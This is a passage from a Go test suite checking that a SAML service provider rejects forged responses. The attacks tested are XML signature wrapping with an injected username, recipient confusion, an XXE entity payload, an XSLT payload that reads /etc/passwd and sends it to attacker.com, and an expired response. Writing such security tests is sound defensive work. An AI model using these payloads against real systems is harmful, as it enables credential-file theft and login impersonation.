		ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

		// Copy the Response Element
		// This copy will not be changed and contain the original Response content
		originalResponseEl := evilResponseEl.Copy()
		originalResponseDoc := etree.NewDocument()
		originalResponseDoc.SetRoot(originalResponseEl)

		RemoveResponseSignature(evilResponseDoc)

		RemoveAssertionSignature(originalResponseDoc)
		evilResponseDoc.FindElement("//Response/Assertion/Signature").AddChild(etree.NewElement("Object"))
		evilResponseDoc.FindElement("//Assertion/Signature/Object").AddChild(originalResponseDoc.FindElement("//Assertion"))

		// Change the username
		evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil-alice")

		// Get Reponse string
		responseStr, err := evilResponseDoc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		_, err = testMiddleware.Middleware.ServiceProvider.ParseResponse(req, []string{authnRequestID})
		require.Error(t, err)

		// Now we have to check that either the assertion does not pass, or that the attributes do not contain the injected attribute
		assert.Check(t, (resp.Code == http.StatusForbidden))
	})

	// If the response was meant for a different Service Provider, the current Service Provider should notice it and reject the authentication
	t.Run("case=token recipient confusion", func(t *testing.T) {

		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Change the ACS Endpoint location in order to change the recipient in the SAML Assertion
		authnRequest.ACSEndpoint.Location = "https://test.com"

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// This is the Happy Path, the HTTP response code should be 302 (Found status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))

	})

	t.Run("case=xml external entity", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Payload XEE
		xee := "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM  \"file:///dev/random\" >]><foo>&xxe;</foo>"

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		fmt.Println(xee + responseStr)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, xee+responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// This is the Happy Path, the HTTP response code should be 302 (Found status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=extensible stylesheet language transformation", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Payload XSLT
		xslt := "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"doc\"><xsl:variable name=\"file\" select=\"unparsed-text('/etc/passwd')\"/><xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"/><xsl:variable name=\"attackerUrl\" select=\"'http://attacker.com/'\"/><xsl:variable name=\"exploitUrl\" select=\"concat($attackerUrl,$escaped)\"/><xsl:value-of select=\"unparsed-text($exploitUrl)\"/></xsl:template></xsl:stylesheet>"
		xsltDoc := etree.NewDocument()
		xsltDoc.ReadFromString(xslt)
		xsltElement := xsltDoc.SelectElement("stylesheet")
		doc.FindElement("//Transforms").AddChild(xsltElement)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		fmt.Println(responseStr)
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// This is the Happy Path, the HTTP response code should be 302 (Found status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=expired saml reponse", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// The answer was forged on January 1 and therefore we set the current date to January 2 so that it is expired
		TimeNow = func() time.Time {
			rv, _ := time.Parse("Mon Jan 2 15:04:05.999999999 MST 2006", "Wed Jan 2 01:57:09.123456789 UTC 2014")
			return rv
		}

		saml.TimeNow = TimeNow

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

}
